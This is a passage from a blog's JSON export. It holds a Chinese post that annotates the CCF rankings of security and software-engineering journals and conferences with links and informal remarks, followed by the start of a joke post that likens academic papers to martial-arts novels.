Research in Computer Security</a></li>\n<li>FSE <a href=\"https://fse22.gatech.edu/\">Fast Software Encryption</a></li>\n<li>NDSS <a href=\"http://www.internetsociety.org/events/ndss-symposium-2014\">ISOC Network and Distributed System Security Symposium</a></li>\n<li>CSFW <a href=\"http://cscw.acm.org/2014/\">IEEE Computer Security Foundations Workshop</a></li>\n<li>RAID <a href=\"http://www.raid2014.eu/\">International Symposium on Recent Advances in Intrusion Detection</a></li>\n<li>PKC <a href=\"http://www.iacr.org/workshops/pkc2014/\">International Workshop on Practice and Theory in Public Key Cryptography</a></li>\n<li>DSN <a href=\"http://2014.dsn.org/\">The International Conference on Dependable Systems and Networks</a></li>\n<li>TCC <a href=\"http://www.iacr.org/workshops/tcc2014/call_for_papers.html\">Theory of Cryptography Conference</a> 不看</li>\n<li>SRDS <a href=\"http://www-nishio.ist.osaka-u.ac.jp/conf/srds2014/\">IEEE International Symposium on Reliable Distributed Systems</a></li>\n<li>CHES <a href=\"http://www.chesworkshop.org/ches2014/start.php\">Workshop on Cryptographic Hardware and Embedded Systems</a> 不看</li>\n</ul>\n<h3 id=\"c\">C 类会议</h3>\n<ul>\n<li>WiSec <a href=\"http://www.sigsac.org/wisec/WiSec2014/\">ACM Conference on Security and Privacy<br>\nin Wireless and Mobile Networks</a></li>\n<li>ACM MM&amp;SEC <a href=\"http://www.ihmmsec.org/index.php/ihmmsec2014\">ACM Multimedia and Security Workshop</a></li>\n<li>SACMAT <a href=\"http://www.sacmat.org/2014/index.php\">ACM Symposium on Access Control Models<br>\nand Technologies</a></li>\n<li>ASIACCS <a href=\"http://asiaccs2014.nict.go.jp/\">ACM Symposium on Information, Computer<br>\nand Communications Security</a></li>\n<li>DRM <a href=\"\">ACM Workshop on Digital Rights Management</a> 不沾边</li>\n<li>ACNS <a href=\"http://acns2014.epfl.ch/\">Applied Cryptography and Network Security</a> 感觉不靠谱</li>\n<li>ACISP <a href=\"https://ssl.informatics.uow.edu.au/acisp2014/\">Australasia Conference on Information Security and Privacy</a></li>\n<li>DFRWS <a href=\"http://www.dfrws.org/2014/\">Digital Forensic Research Workshop</a></li>\n<li>FC <a href=\"http://fc14.ifca.ai/\">Financial Cryptography and Data Security</a> 感觉不靠谱</li>\n<li>DIMVA <a href=\"http://dimva2014.isg.rhul.ac.uk/\">Detection of Intrusions and Malware &amp; Vulnerability Assessment</a> 名字真耐人，必须看</li>\n<li>SEC <a href=\"http://www.ifipsec.org/\">IFIP International Information Security Conference</a></li>\n<li>IFIP WG 11.9 <a href=\"http://www.ifip119.org/Conferences/\">IFIP WG 11.9 International Conference on Digital Forensics</a></li>\n<li>ISC <a href=\"http://isc14.ie.cuhk.edu.hk/\">Information Security Conference</a></li>\n<li>SecureComm <a href=\"http://securecomm.org/2014/show/home\">International Conference on Security and Privacy in Communication Networks</a></li>\n<li>NSPW <a href=\"http://www.nspw.org/2014\">New Security Paradigms Workshop</a></li>\n<li>CT-RSA <a href=\"\">RSA Conference, Cryptographers' Track</a> 密码不看</li>\n<li>SOUPS <a href=\"https://cups.cs.cmu.edu/soups/2014/\">Symposium On Usable Privacy and Security</a></li>\n<li>HotSec <a href=\"https://www.usenix.org/conference/hotsec14\">USENIX Workshop on Hot Topics in Security</a></li>\n<li>SAC <a href=\"\">Selected Areas in Cryptography</a> 密码不看</li>\n<li>TrustCom <a href=\"http://www.greenorbs.org/TrustCom2014/\">IEEE International Conference on Trust, Security and Privacy in Computing and Communications</a></li>\n</ul>\n<h2 id=\"\">软件工程类期刊和会议</h2>\n<h3 id=\"a\">A 类期刊</h3>\n<ul>\n<li>TOPLAS <a href=\"\">ACM Transactions on Programming Languages &amp; Systems</a> 感觉不用看</li>\n<li>TOSEM <a href=\"http://tosem.acm.org/\">ACM Transactions on Software Engineering Methodology</a> 感觉不用看</li>\n<li>TSE <a href=\"http://www.computer.org/web/tse\">IEEE Transactions on Software Engineering</a> Vol 40 DEC 12 一篇</li>\n</ul>\n<h3 id=\"b\">B 类期刊</h3>\n<ul>\n<li>ASE <a href=\"http://link.springer.com/journal/10515\">Automated Software Engineering</a></li>\n<li><a href=\"http://link.springer.com/journal/10664\">Empirical Software Engineering</a></li>\n<li>TSC <a href=\"http://www.computer.org/web/tsc\">IEEE Transactions on Service Computing</a></li>\n<li>IETS <a href=\"http://digital-library.theiet.org/content/journals/iet-sen\">IET Software</a></li>\n<li>IST <a href=\"http://www.journals.elsevier.com/information-and-software-technology/\">Information and Software Technology</a></li>\n<li>JFP <a href=\"http://journals.cambridge.org/action/displayJournal?jid=JFP\">Journal of Functional Programming</a></li>\n<li><a href=\"http://onlinelibrary.wiley.com/journal/10.1002/(ISSN)2047-7481\">Journal of Software: Evolution and Process</a></li>\n<li>JSS <a href=\"http://www.journals.elsevier.com/journal-of-systems-and-software/\">Journal of Systems and Software</a></li>\n<li>RE <a href=\"http://link.springer.com/journal/766\">Requirements Engineering</a></li>\n<li>SCP <a href=\"http://www.journals.elsevier.com/science-of-computer-programming/\">Science of Computer Programming</a></li>\n<li>SoSyM <a href=\"http://www.springer.com/computer/swe/journal/10270\">Software and System Modeling</a></li>\n<li>SPE <a href=\"http://onlinelibrary.wiley.com/journal/10.1002/(ISSN)1097-024X\">Software: Practice and Experience</a></li>\n<li>STVR <a href=\"http://onlinelibrary.wiley.com/journal/10.1002/(ISSN)1099-1689\">Software Testing, Verification and Reliability</a> 可能有</li>\n</ul>\n<h3 id=\"c\">C 类期刊</h3>\n<ul>\n<li><a href=\"http://www.journals.elsevier.com/computer-languages-systems-and-structures/\">Computer Languages, Systems and Structures</a></li>\n<li>IJSEKE <a href=\"http://www.worldscientific.com/worldscinet/ijseke\">International Journal on Software Engineering and Knowledge Engineering</a></li>\n<li>STTT <a href=\"http://link.springer.com/journal/10009\">International Journal on Software Tools for Technology Transfer</a></li>\n<li><a href=\"http://www.journals.elsevier.com/the-journal-of-logic-and-algebraic-programming/\">Journal of Logic and Algebraic Programming</a></li>\n<li>JWE <a href=\"http://www.rintonpress.com/journals/jwe/\">Journal of Web Engineering</a></li>\n<li><a href=\"http://www.springer.com/computer/communication+networks/journal/11761\">Service Oriented Computing and Applications</a></li>\n<li>SQJ <a href=\"http://www.springer.com/computer/swe/journal/11219\">Software Quality Journal</a></li>\n<li>TPLP <a href=\"http://journals.cambridge.org/action/displayJournal?jid=TLP\">Theory and Practice of Logic Programming</a></li>\n</ul>\n<h3 id=\"a\">A 类会议</h3>\n<ul>\n<li>FSE/ESEC <a href=\"http://esec-fse15.dei.polimi.it/\">ACM SIGSOFT Symposium on the Foundation of Software Engineering/ European Software Engineering Conference</a> 今年有篇文章，贾老师基友也发过文章</li>\n<li>OOPSLA <a href=\"http://2015.splashcon.org/\">Conference on Object-Oriented Programming Systems, Languages, and Applications</a></li>\n<li>ICSE <a href=\"http://2015.icse-conferences.org/\">International Conference on Software Engineering</a></li>\n<li>OSDI <a href=\"https://www.usenix.org/conference/osdi14\">USENIX Symposium on Operating Systems Design and Implementations</a></li>\n<li>PLDI <a href=\"http://conf.researchr.org/home/pldi2015\">ACM SIGPLAN Symposium on Programming Language Design &amp; Implementation</a></li>\n<li>POPL <a href=\"http://popl.mpi-sws.org/2015/\">ACM SIGPLAN-SIGACT Symposium on Principles of Programming Languages</a></li>\n<li>SOSP <a href=\"http://www.ssrc.ucsc.edu/sosp15/\">ACM Symposium on Operating Systems Principles</a> 征文稿有安全分支</li>\n</ul>\n<h3 id=\"b\">B 类会议</h3>\n<ul>\n<li>ECOOP <a href=\"http://ecoop.org/\">European Conference on Object-Oriented Programming</a></li>\n<li>ETAPS <a href=\"http://www.etaps.org/\">European Joint Conferences on Theory and Practice of Software</a></li>\n<li>FM <a href=\"http://www.fmeurope.org/\">Formal Methods, World Congress</a></li>\n<li>ICPC <a href=\"https://dibt.unimol.it/ICPC15/Home.html\">IEEE International Conference on Program Comprehension</a></li>\n<li>RE <a href=\"http://re15.org/\">IEEE International Requirement Engineering Conference</a></li>\n<li>CAiSE <a href=\"http://caise2015.dsv.su.se/\">International Conference on Advanced Information Systems Engineering</a></li>\n<li>ASE <a href=\"http://ase2015.unl.edu/#tab-main\">International Conference on Automated Software Engineering</a> 有安全分支，贾老师的基友发过文章。</li>\n<li>ICFP <a href=\"http://icfpconference.org/icfp2015/\">International Conf on Function Programming</a></li>\n<li>LCTES <a href=\"http://lctes2015.lctes.org/\">International Conference on Languages, Compilers, Tools and Theory for Embedded Systems</a></li>\n<li>MoDELS <a href=\"http://www.modelsconference.org/\">International Conference on Model Driven Engineering Languages and Systems</a></li>\n<li>CP <a href=\"http://booleconferences.ucc.ie/cp2015\">International Conference on Principles and Practice of Constraint Programming</a></li>\n<li>ICSOC <a href=\"http://www.icsoc.org/\">International Conference on Service Oriented Computing</a></li>\n<li>ICSM <a href=\"http://www.icsm2015.org/\">International. Conference on Software Maintenance</a></li>\n<li>VMCAI <a href=\"http://research.microsoft.com/en-us/events/vmcai2015/\">International Conference on Verification, Model Checking, and Abstract Interpretation</a></li>\n<li>ICWS <a href=\"http://conferences.computer.org/icws/2015/\">International Conference on Web Services（Research Track）</a></li>\n<li>SAS <a href=\"http://sas2015.inria.fr/\">International Static Analysis Symposium</a></li>\n<li>ISSRE <a href=\"http://issre.net/\">International Symposium on Software Reliability Engineering</a></li>\n<li>ISSTA <a href=\"http://issta2015.cs.uoregon.edu/\">International Symposium on Software Testing and Analysis</a></li>\n<li>Middleware <a href=\"http://www.middleware-conference.org/\">Conference on middleware</a></li>\n<li>WCRE <a href=\"http://wcre.wikidot.com/2013\">Working Conference on Reverse Engineering</a> 逆向的会，希望很大。</li>\n<li>HotOS <a href=\"https://www.usenix.org/conference/hotos15\">USENIX Workshop on Hot Topics in Operating Systems</a></li>\n</ul>\n<h3 id=\"c\">C 类会议</h3>\n<ul>\n<li>PASTE <a href=\"http://www.wikicfp.com/cfp/servlet/event.showcfp?eventid=28174&copyownerid=7812\">ACM SIGPLAN-SIGSOFT Workshop on Program Analysis for Software Tools and Engineering</a></li>\n<li>APLAS <a href=\"http://pl.postech.ac.kr/aplas2015/\">Asian Symposium on Programming Languages and Systems</a></li>\n<li>APSEC <a href=\"http://www.apsec2015.org/\">Asia-Pacific Software Engineering Conference</a></li>\n<li>COMPSAC <a href=\"http://www.computer.org/portal/web/COMPSAC\">International Computer Software and Applications Conference</a> 台湾那个会，许老师是常客</li>\n<li>ICECCS <a href=\"http://iceccs2015.monash.edu.au/2015/index.jsp\">IEEE International Conference on Engineering of Complex Computer Systems</a></li>\n<li>SCAM <a href=\"http://www.ieee-scam.org/\">IEEE International Working Conference on Source Code Analysis and Manipulation</a></li>\n<li>ICFEM <a href=\"http://icfem2015.lri.fr/\">International Conference on Formal Engineering Methods</a></li>\n<li>TOOLS <a href=\"http://tools.ethz.ch/\">International Conference on Objects, Models, Components, Patterns</a></li>\n<li>PEPM <a href=\"http://conf.researchr.org/home/pepm2015\">ACM SIGPLAN Symposium on Partial Evaluation and Semantics Based Programming Manipulation</a></li>\n<li>QSIC <a href=\"http://paris.utdallas.edu/qsic15/\">International Conference on Quality Software</a></li>\n<li>SEKE <a href=\"http://www.ksi.edu/seke/seke15.html\">International Conference on Software Engineering and Knowledge Engineering</a></li>\n<li>ICSR <a href=\"http://www.icsoro.org/icsr2015/\">International Conference on Software Reuse</a></li>\n<li>ICWE <a href=\"http://icwe2015.webengineering.org/\">International Conference on Web Engineering</a></li>\n<li>SPIN <a href=\"http://www.spin2015.com/\">International SPIN Workshop on Model Checking of Software</a></li>\n<li>LOPSTR <a href=\"http://alpha.diism.unisi.it/lopstr15/\">International Symposium on Logic-based Program Synthesis and Transformation</a></li>\n<li>TASE <a href=\"http://tase2015.nuaa.edu.cn/\">International Symposium on Theoretical Aspects of Software Engineering</a> 有安全分支，我发过文章。</li>\n<li>ICST <a href=\"http://icst2015.ist.tu-graz.ac.at/\">The IEEE International Conference on Software Testing, Verification and Validation</a></li>\n<li>ATVA <a href=\"http://atva2015.ios.ac.cn/\">International Symposium on Automated Technology for Verification and Analysis</a></li>\n<li>ESEM <a href=\"http://esem-conferences.org/index.php\">International Symposium on Empirical Software Engineering and Measurement</a></li>\n<li>ISPASS <a href=\"http://ispass.org/ispass2015/\">IEEE International Symposium on Performance Analysis of Systems and Software</a></li>\n<li>SCC <a href=\"http://conferences.computer.org/scc/2015/\">International Conference on Service Computing</a></li>\n<li>ICSSP <a href=\"http://www.icsp-conferences.org/icssp2015/\">International Conference on Software and System Process</a></li>\n</ul>\n<h2 id=\"\">总结</h2>\n<ol>\n<li>很明显行或不行的，我备注了。顺手发现的东西，都备注了。</li>\n<li>软件工程这边的会和期刊的分类是“软件工程、系统软件与程序设计语言”，所以从名字上看，明显没关系的期刊和会找到文章的希望不大。</li>\n<li>如果像早上说的，都不是正交，把范围都扩大，那安全那边还有不少可以找。软件这边更多的是赶着走。</li>\n<li>期刊都是链接到官网。原则上，安全的会我都链接到了14 年，软工的会都链接到了15 年，个别死链是因为我觉得没用所以就没找。</li>\n<li>安全列表来自：<a href=\"http://www.ccf.org.cn/sites/ccf/biaodan.jsp?contentId=2567814757428\">http://www.ccf.org.cn/sites/ccf/biaodan.jsp?contentId=2567814757428</a></li>\n<li>软件列表来自：<a href=\"http://www.ccf.org.cn/sites/ccf/biaodan.jsp?contentId=2567814757404\">http://www.ccf.org.cn/sites/ccf/biaodan.jsp?contentId=2567814757404</a></li>\n</ol>\n<hr>\n</div>","amp":"11","plaintext":"信息安全类期刊和会议\nA 类期刊\n * TDSC IEEE Transactions on Dependable and Secure Computing\n   [http://www.computer.org/portal/web/tdsc]\n * TIFS IEEE Transactions on Information Forensics and Security\n   [http://ieeexplore.ieee.org/xpl/RecentIssue.jsp?punumber=10206]\n * Journal of Cryptology 密码学，可略过\n\nB 类期刊\n * TISSEC ACM Transactions on Information and System Security\n   [http://tissec.acm.org/]  官网首页有篇文章\n * Computers & Security\n   [http://www.journals.elsevier.com/computers-and-security/]  2015 Volume 51\n   有文章\n * Designs, Codes and Cryptography [http://link.springer.com/journal/10623] \n   密码学，不靠谱\n * JCS Journal of Computer Security\n   [http://iospress.metapress.com/content/103167/]  Volume 22 Issue 3 有文章\n\nC 类期刊\n * CLSR Computer Law and Security Reports\n   [http://www.journals.elsevier.com/computer-law-and-security-review/] \n   法律法规，不靠谱\n * EURASIP Journal on Information Security [http://jis.eurasipjournals.com/]\n * IET Information Security\n   [http://digital-library.theiet.org/content/journals/iet-ifs]\n * IMCS Information Management & Computer Security\n   [http://www.emeraldinsight.com/loi/imcs]\n * ISTR Information Security Technical Report\n   [http://www.sciencedirect.com/science/journal/13634127]  首页有文章\n * IJISP International Journal of Information Security and Privacy\n   [http://www.igi-global.com/journal/international-journal-information-security-privacy/1096]\n * IJICS International Journal of Information and Computer Security\n   [http://www.inderscience.com/jhome.php?jcode=ijics]\n * SCN Security and Communication Networks\n   [http://onlinelibrary.wiley.com/journal/10.1002/(ISSN)1939-0122]\n\nA 类会议\n * CCS ACM Conference on Computer and Communications Security\n   [http://www.sigsac.org/ccs/CCS2014/]\n * CRYPTO International Cryptology Conference  密码不看\n * EUROCRYPT European Cryptology Conference  密码不看\n * S & P IEEE Symposium on Security and Privacy\n   [http://www.ieee-security.org/TC/SP2014/]\n * USENIX Security Usenix Security Symposium\n   [https://www.usenix.org/conference/usenixsecurity14]\n\nB 类会议\n * ACSAC Annual Computer Security Applications\n   Conference [https://www.acsac.org/2014/]\n * ASIACRYPT Annual International Conference on the Theory and Application of\n   Cryptology and Information Security\n   [http://des.cse.nsysu.edu.tw/asiacrypt2014/]\n * ESORICS European Symposiumon Research in Computer Security\n   [http://esorics2014.pwr.wroc.pl/]\n * FSE Fast Software Encryption [https://fse22.gatech.edu/]\n * NDSS ISOC Network and Distributed System Security Symposium\n   [http://www.internetsociety.org/events/ndss-symposium-2014]\n * CSFW IEEE Computer Security Foundations Workshop [http://cscw.acm.org/2014/]\n * RAID International Symposium on Recent Advances in Intrusion Detection\n   [http://www.raid2014.eu/]\n * PKC International Workshop on Practice and Theory in Public Key Cryptography\n   [http://www.iacr.org/workshops/pkc2014/]\n * DSN The International Conference on Dependable Systems and Networks\n   [http://2014.dsn.org/]\n * TCC Theory of Cryptography Conference\n   [http://www.iacr.org/workshops/tcc2014/call_for_papers.html]  不看\n * SRDS IEEE International Symposium on Reliable Distributed Systems\n   [http://www-nishio.ist.osaka-u.ac.jp/conf/srds2014/]\n * CHES Workshop on Cryptographic Hardware and Embedded Systems\n   [http://www.chesworkshop.org/ches2014/start.php]  不看\n\nC 类会议\n * WiSec ACM Conference on Security and Privacy\n   in Wireless and Mobile Networks [http://www.sigsac.org/wisec/WiSec2014/]\n * ACM MM&SEC ACM Multimedia and Security Workshop\n   [http://www.ihmmsec.org/index.php/ihmmsec2014]\n * SACMAT ACM Symposium on Access Control Models\n   and Technologies [http://www.sacmat.org/2014/index.php]\n * ASIACCS ACM Symposium on Information, Computer\n   and Communications Security [http://asiaccs2014.nict.go.jp/]\n * DRM ACM Workshop on Digital Rights Management  不沾边\n * ACNS Applied Cryptography and Network Security [http://acns2014.epfl.ch/] \n   感觉不靠谱\n * ACISP Australasia Conference on Information Security and Privacy\n   [https://ssl.informatics.uow.edu.au/acisp2014/]\n * DFRWS Digital Forensic Research Workshop [http://www.dfrws.org/2014/]\n * FC Financial Cryptography and Data Security [http://fc14.ifca.ai/]  感觉不靠谱\n * DIMVA Detection of Intrusions and Malware & Vulnerability Assessment\n   [http://dimva2014.isg.rhul.ac.uk/]  名字真耐人，必须看\n * SEC IFIP International Information Security Conference\n   [http://www.ifipsec.org/]\n * IFIP WG 11.9 IFIP WG 11.9 International Conference on Digital Forensics\n   [http://www.ifip119.org/Conferences/]\n * ISC Information Security Conference [http://isc14.ie.cuhk.edu.hk/]\n * SecureComm International Conference on Security and Privacy in Communication\n   Networks [http://securecomm.org/2014/show/home]\n * NSPW New Security Paradigms Workshop [http://www.nspw.org/2014]\n * CT-RSA RSA Conference, Cryptographers' Track  密码不看\n * SOUPS Symposium On Usable Privacy and Security\n   [https://cups.cs.cmu.edu/soups/2014/]\n * HotSec USENIX Workshop on Hot Topics in Security\n   [https://www.usenix.org/conference/hotsec14]\n * SAC Selected Areas in Cryptography  密码不看\n * TrustCom IEEE International Conference on Trust, Security and Privacy in\n   Computing and Communications [http://www.greenorbs.org/TrustCom2014/]\n\n软件工程类期刊和会议\nA 类期刊\n * TOPLAS ACM Transactions on Programming Languages & Systems  感觉不用看\n * TOSEM ACM Transactions on Software Engineering Methodology\n   [http://tosem.acm.org/]  感觉不用看\n * TSE IEEE Transactions on Software Engineering\n   [http://www.computer.org/web/tse]  Vol 40 DEC 12 一篇\n\nB 类期刊\n * ASE Automated Software Engineering [http://link.springer.com/journal/10515]\n * Empirical Software Engineering [http://link.springer.com/journal/10664]\n * TSC IEEE Transactions on Service Computing [http://www.computer.org/web/tsc]\n * IETS IET Software\n   [http://digital-library.theiet.org/content/journals/iet-sen]\n * IST Information and Software Technology\n   [http://www.journals.elsevier.com/information-and-software-technology/]\n * JFP Journal of Functional Programming\n   [http://journals.cambridge.org/action/displayJournal?jid=JFP]\n * Journal of Software: Evolution and Process\n   [http://onlinelibrary.wiley.com/journal/10.1002/(ISSN)2047-7481]\n * JSS Journal of Systems and Software\n   [http://www.journals.elsevier.com/journal-of-systems-and-software/]\n * RE Requirements Engineering [http://link.springer.com/journal/766]\n * SCP Science of Computer Programming\n   [http://www.journals.elsevier.com/science-of-computer-programming/]\n * SoSyM Software and System Modeling\n   [http://www.springer.com/computer/swe/journal/10270]\n * SPE Software: Practice and Experience\n   [http://onlinelibrary.wiley.com/journal/10.1002/(ISSN)1097-024X]\n * STVR Software Testing, Verification and Reliability\n   [http://onlinelibrary.wiley.com/journal/10.1002/(ISSN)1099-1689]  可能有\n\nC 类期刊\n * Computer Languages, Systems and Structures\n   [http://www.journals.elsevier.com/computer-languages-systems-and-structures/]\n * IJSEKE International Journal on Software Engineering and Knowledge\n   Engineering [http://www.worldscientific.com/worldscinet/ijseke]\n * STTT International Journal on Software Tools for Technology Transfer\n   [http://link.springer.com/journal/10009]\n * Journal of Logic and Algebraic Programming\n   [http://www.journals.elsevier.com/the-journal-of-logic-and-algebraic-programming/]\n * JWE Journal of Web Engineering [http://www.rintonpress.com/journals/jwe/]\n * Service Oriented Computing and Applications\n   [http://www.springer.com/computer/communication+networks/journal/11761]\n * SQJ Software Quality Journal\n   [http://www.springer.com/computer/swe/journal/11219]\n * TPLP Theory and Practice of Logic Programming\n   [http://journals.cambridge.org/action/displayJournal?jid=TLP]\n\nA 类会议\n * FSE/ESEC ACM SIGSOFT Symposium on the Foundation of Software Engineering/\n   European Software Engineering Conference [http://esec-fse15.dei.polimi.it/] \n   今年有篇文章，贾老师基友也发过文章\n * OOPSLA Conference on Object-Oriented Programming Systems, Languages, and\n   Applications [http://2015.splashcon.org/]\n * ICSE International Conference on Software Engineering\n   [http://2015.icse-conferences.org/]\n * OSDI USENIX Symposium on Operating Systems Design and Implementations\n   [https://www.usenix.org/conference/osdi14]\n * PLDI ACM SIGPLAN Symposium on Programming Language Design & Implementation\n   [http://conf.researchr.org/home/pldi2015]\n * POPL ACM SIGPLAN-SIGACT Symposium on Principles of Programming Languages\n   [http://popl.mpi-sws.org/2015/]\n * SOSP ACM Symposium on Operating Systems Principles\n   [http://www.ssrc.ucsc.edu/sosp15/]  征文稿有安全分支\n\nB 类会议\n * ECOOP European Conference on Object-Oriented Programming [http://ecoop.org/]\n * ETAPS European Joint Conferences on Theory and Practice of Software\n   [http://www.etaps.org/]\n * FM Formal Methods, World Congress [http://www.fmeurope.org/]\n * ICPC IEEE International Conference on Program Comprehension\n   [https://dibt.unimol.it/ICPC15/Home.html]\n * RE IEEE International Requirement Engineering Conference [http://re15.org/]\n * CAiSE International Conference on Advanced Information Systems Engineering\n   [http://caise2015.dsv.su.se/]\n * ASE International Conference on Automated Software Engineering \n   有安全分支，贾老师的基友发过文章。\n * ICFP International Conf on Function Programming\n   [http://icfpconference.org/icfp2015/]\n * LCTES International Conference on Languages, Compilers, Tools and Theory for\n   Embedded Systems [http://lctes2015.lctes.org/]\n * MoDELS International Conference on Model Driven Engineering Languages and\n   Systems [http://www.modelsconference.org/]\n * CP International Conference on Principles and Practice of Constraint\n   Programming [http://booleconferences.ucc.ie/cp2015]\n * ICSOC International Conference on Service Oriented Computing\n   [http://www.icsoc.org/]\n * ICSM International. Conference on Software Maintenance\n   [http://www.icsm2015.org/]\n * VMCAI International Conference on Verification, Model Checking, and Abstract\n   Interpretation [http://research.microsoft.com/en-us/events/vmcai2015/]\n * ICWS International Conference on Web Services（Research Track）\n   [http://conferences.computer.org/icws/2015/]\n * SAS International Static Analysis Symposium [http://sas2015.inria.fr/]\n * ISSRE International Symposium on Software Reliability Engineering\n   [http://issre.net/]\n * ISSTA International Symposium on Software Testing and Analysis\n   [http://issta2015.cs.uoregon.edu/]\n * Middleware Conference on middleware [http://www.middleware-conference.org/]\n * WCRE Working Conference on Reverse Engineering [http://wcre.wikidot.com/2013] \n    逆向的会，希望很大。\n * HotOS USENIX Workshop on Hot Topics in Operating Systems\n   [https://www.usenix.org/conference/hotos15]\n\nC 类会议\n * PASTE ACM SIGPLAN-SIGSOFT Workshop on Program Analysis for Software Tools\n   and\n   Engineering\n   [http://www.wikicfp.com/cfp/servlet/event.showcfp?eventid=28174©ownerid=7812]\n * APLAS Asian Symposium on Programming Languages and Systems\n   [http://pl.postech.ac.kr/aplas2015/]\n * APSEC Asia-Pacific Software Engineering Conference\n   [http://www.apsec2015.org/]\n * COMPSAC International Computer Software and Applications Conference\n   [http://www.computer.org/portal/web/COMPSAC]  台湾那个会，许老师是常客\n * ICECCS IEEE International Conference on Engineering of Complex Computer\n   Systems [http://iceccs2015.monash.edu.au/2015/index.jsp]\n * SCAM IEEE International Working Conference on Source Code Analysis and\n   Manipulation [http://www.ieee-scam.org/]\n * ICFEM International Conference on Formal Engineering Methods\n   [http://icfem2015.lri.fr/]\n * TOOLS International Conference on Objects, Models, Components, Patterns\n   [http://tools.ethz.ch/]\n * PEPM ACM SIGPLAN Symposium on Partial Evaluation and Semantics Based\n   Programming Manipulation [http://conf.researchr.org/home/pepm2015]\n * QSIC International Conference on Quality Software\n   [http://paris.utdallas.edu/qsic15/]\n * SEKE International Conference on Software Engineering and Knowledge\n   Engineering [http://www.ksi.edu/seke/seke15.html]\n * ICSR International Conference on Software Reuse\n   [http://www.icsoro.org/icsr2015/]\n * ICWE International Conference on Web Engineering\n   [http://icwe2015.webengineering.org/]\n * SPIN International SPIN Workshop on Model Checking of Software\n   [http://www.spin2015.com/]\n * LOPSTR International Symposium on Logic-based Program Synthesis and\n   Transformation [http://alpha.diism.unisi.it/lopstr15/]\n * TASE International Symposium on Theoretical Aspects of Software Engineering\n   [http://tase2015.nuaa.edu.cn/]  有安全分支，我发过文章。\n * ICST The IEEE International Conference on Software Testing, Verification and\n   Validation [http://icst2015.ist.tu-graz.ac.at/]\n * ATVA International Symposium on Automated Technology for Verification and\n   Analysis [http://atva2015.ios.ac.cn/]\n * ESEM International Symposium on Empirical Software Engineering and\n   Measurement [http://esem-conferences.org/index.php]\n * ISPASS IEEE International Symposium on Performance Analysis of Systems and\n   Software [http://ispass.org/ispass2015/]\n * SCC International Conference on Service Computing\n   [http://conferences.computer.org/scc/2015/]\n * ICSSP International Conference on Software and System Process\n   [http://www.icsp-conferences.org/icssp2015/]\n\n总结\n 1. 很明显行或不行的，我备注了。顺手发现的东西，都备注了。\n 2. 软件工程这边的会和期刊的分类是“软件工程、系统软件与程序设计语言”，所以从名字上看，明显没关系的期刊和会找到文章的希望不大。\n 3. 如果像早上说的，都不是正交，把范围都扩大，那安全那边还有不少可以找。软件这边更多的是赶着走。\n 4. 期刊都是链接到官网。原则上，安全的会我都链接到了14 年，软工的会都链接到了15 年，个别死链是因为我觉得没用所以就没找。\n 5. 安全列表来自：http://www.ccf.org.cn/sites/ccf/biaodan.jsp?contentId=2567814757428\n 6. 软件列表来自：http://www.ccf.org.cn/sites/ccf/biaodan.jsp?contentId=2567814757404\n\n\n--------------------------------------------------------------------------------","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-07-09T07:05:46.000Z","created_by":"1","updated_at":"2015-07-09T12:33:02.000Z","updated_by":"1","published_at":"2015-07-09T11:57:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c41","uuid":"f8da853c-03db-4ffd-80bf-90d94be1b6c8","title":"写学术论文就像写武侠小说","slug":"lun-wen-xiao-hua","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"师兄名言，来自网络：\\n\\n论文和武侠小说其实是一样的，写论文就好比写小说。武侠风格尤佳。\\n\\n首先营造一个紧张的气氛，烘托出一个必须解决的严重问题。（提出问题所在，并表明此问题急需解决）\\n       \\n接着绿叶登场，挨个败下阵来。（指出前人的研究的不足之处，为后面自己的研究优势所在做铺垫）\\n       \\n然后主人公粉墨登场，在精巧的情节布局之下，他的特长刚好得到最大限度地发挥，他的缺陷刚好都不重要，甚至还能变废为宝。（给出自己的研究成果，并指出自己的方法有很大的优势。多数文章中自己的研究中的缺陷作者貌似都描写的让人觉得那不是问题）\\n \\n于是主人公拯救了学术界，并在剧终谦虚地表示，由于时间有限自己的必杀大招还有 6 层没有修炼。（作者谦虚的表示后面还有很多工作要做）\\n\\n附：如何用科学语言表达你实际的意思。\\n<br />\\n![](/content/images/2015/07/paperjoke.jpg)\\n<br />\\n\\n---\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>师兄名言，来自网络：</p>\n<p>论文和武侠小说其实是一样的，写论文就好比写小说。武侠风格尤佳。</p>\n<p>首先营造一个紧张的气氛，烘托出一个必须解决的严重问题。（提出问题所在，并表明此问题急需解决）</p>\n<p>接着绿叶登场，挨个败下阵来。（指出前人的研究的不足之处，为后面自己的研究优势所在做铺垫）</p>\n<p>然后主人公粉墨登场，在精巧的情节布局之下，他的特长刚好得到最大限度地发挥，他的缺陷刚好都不重要，甚至还能变废为宝。（给出自己的研究成果，并指出自己的方法有很大的优势。多数文章中自己的研究中的缺陷作者貌似都描写的让人觉得那不是问题）</p>\n<p>于是主人公拯救了学术界，并在剧终谦虚地表示，由于时间有限自己的必杀大招还有 6 层没有修炼。（作者谦虚的表示后面还有很多工作要做）</p>\n<p>附：如何用科学语言表达你实际的意思。<br>\n<br /><br>\n<img src=\"/content/images/2015/07/paperjoke.jpg\" alt=\"\"><br>\n<br /></p>\n<hr>\n</div>","amp":"12","plaintext":"师兄名言，来自网络：\n\n论文和武侠小说其实是一样的，写论文就好比写小说。武侠风格尤佳。\n\n首先营造一个紧张的气氛，烘托出一个必须解决的严重问题。（提出问题所在，并表明此问题急需解决）\n\n接着绿叶登场，挨个败下阵来。（指出前人的研究的不足之处，为后面自己的研究优势所在做铺垫）\n\n然后主人公粉墨登场，在精巧的情节布局之下，他的特长刚好得到最大限度地发挥，他的缺陷刚好都不重要，甚至还能变废为宝。（给出自己的研究成果，并指出自己的方法有很大的优势。多数文章中自己的研究中的缺陷作者貌似都描写的让人觉得那不是问题）\n\n于是主人公拯救了学术界，并在剧终谦虚地表示，由于时间有限自己的必杀大招还有 6 